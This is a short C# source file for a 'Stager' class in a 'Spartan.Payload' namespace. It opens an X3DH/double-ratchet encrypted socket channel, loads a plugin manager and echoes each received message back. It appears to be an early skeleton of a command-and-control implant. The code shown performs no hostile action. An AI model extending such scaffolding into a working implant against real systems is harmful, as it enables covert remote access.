using Spartan.Models;

namespace Spartan.Payload;

public class Stager
{
    private readonly PluginManager _pluginManager;
    private readonly SocketClient _socketClient;

    public Stager(BinaryReader binaryReader, BinaryWriter binaryWriter)
    {
        _socketClient = new SocketClient(binaryReader, binaryWriter);
        _pluginManager = new PluginManager();

        _socketClient.PerformX3dhHandshake();
        _socketClient.InitializeRatchet();
    }

    public void Run()
    {
        while (true)
        {
            string message = _socketClient.ReceiveData();
            var response = $"You said {message}";
            _socketClient.SendData(response);
        }
    }
}